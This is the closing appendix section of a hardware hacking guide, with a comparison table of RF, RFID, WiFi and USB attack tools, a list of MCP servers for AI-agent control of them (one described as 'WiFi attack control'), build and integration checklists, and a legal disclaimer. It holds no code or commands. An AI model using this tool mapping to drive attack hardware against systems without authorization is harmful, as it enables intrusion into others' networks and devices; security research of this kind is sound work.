| **DFU** | Device Firmware Update — mode for updating firmware |
| **SWD** | Serial Wire Debug — debugging interface for ARM |
| **JTAG** | Joint Test Action Group — debugging and testing interface |
| **IQ** | In-phase/Quadrature — complex signal representation |
| **FFT** | Fast Fourier Transform — frequency domain analysis |
| **AMC** | Automatic Modulation Classification — ML-based signal identification |

---

## Appendix B: Hardware Tool Comparison Matrix

| Tool | Freq Range | TX/RX | Protocol | Price | AI Integration |
|------|------------|-------|----------|-------|----------------|
| **Flipper Zero** | 300-928 MHz | TX/RX | Sub-GHz, RFID, NFC, IR | ~$170 | V3SP3R, MCP |
| **HackRF One** | 1 MHz - 6 GHz | TX/RX | SDR | ~$300 | GNU Radio MCP |
| **RTL-SDR** | 24-1766 MHz | RX | SDR | ~$30 | SDR-MCP |
| **YARD Stick One** | 300-928 MHz | TX/RX | Sub-GHz | ~$100 | rfcat |
| **WiFi Pineapple** | 2.4/5 GHz | TX/RX | WiFi | $99-$399 | Custom MCP |
| **Proxmark3** | 125 kHz, 13.56 MHz | TX/RX | RFID/NFC | $50-$300 | Custom MCP |
| **Ubertooth One** | 2.4 GHz | RX | Bluetooth | ~$120 | Custom MCP |
| **Packet Squirrel** | Ethernet | TX/RX | Network | ~$60 | Custom MCP |
| **LAN Turtle** | Ethernet | TX/RX | Network | ~$60 | Custom MCP |
| **Bash Bunny** | USB | TX/RX | USB | ~$120 | Custom MCP |
| **USB Rubber Ducky** | USB | TX | USB | ~$80 | DuckyScript |

---

## Appendix C: MCP Server Quick Reference

| MCP Server | Tool | Purpose |
|------------|------|---------|
| **gnuradio-mcp** | HackRF, RTL-SDR | SDR control via GNU Radio |
| **aetherlink-sdr-mcp** | Multiple SDR | Comprehensive SDR control |
| **smartsdr-mcp** | FlexRadio | FlexRadio control, CW decode |
| **sdr-mcp** | RTL-SDR | RTL-SDR control, spectrum |
| **proxmark3-mcp** | Proxmark3 | RFID/NFC control |
| **flipper-mcp** | Flipper Zero | Flipper Zero control |
| **pineapple-mcp** | WiFi Pineapple | WiFi attack control |
| **plan-r** | IoT tools | Multi-domain IoT pentesting |

---

## Appendix D: Custom PCB Design Checklist

```
□ Requirements defined
□ Components selected
□ Schematic captured
□ ERC passed
□ Footprints assigned
□ PCB layout completed
□ DRC passed
□ Gerber files generated
□ Drill files generated
□ BOM generated
□ Pick-and-place generated
□ Manufacturer selected
□ Order placed
□ Boards received
□ Assembly completed
□ Testing completed
□ Firmware flashed
□ Integration tested
```

---

## Appendix E: AI Integration Checklist

```
□ MCP servers installed
□ MCP servers configured
□ AI agent configured with MCP servers
□ Tool definitions created
□ Tools tested individually
□ Tool chains tested
□ AI agent tested with tools
□ Error handling implemented
□ Logging implemented
□ Alerting configured
□ Documentation written
□ Team trained
```

---

# END OF THE 2026 HARDWARE HACKER'S BIBLE

---

**Document Statistics:**
- **Total Parts:** 5
- **Total Sections:** 20+
- **Total Subsections:** 50+
- **Total Entries:** 500+
- **Total Appendices:** 5

**Purpose:**
This Bible serves as a comprehensive operational reference for hardware hacking, penetration testing, RF analysis, and AI-integrated hardware security research. It is designed for security researchers, penetration testers, hardware hackers, and AI-first operators.

**Final Note:**
Hardware hacking is a rapidly evolving field. New tools, firmware, and AI integrations emerge constantly. This Bible represents a snapshot of the hardware security landscape as projected for 2026. Users should continue to monitor new developments, community projects, and emerging standards.

**Legal Disclaimer:**
The tools, techniques, and information in this document are provided for authorized security testing, research, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. Always obtain proper authorization before conducting any security assessment.

---

*"The hardware doesn't lie. The firmware doesn't forget. The radio doesn't discriminate. And the AI doesn't sleep."*

---
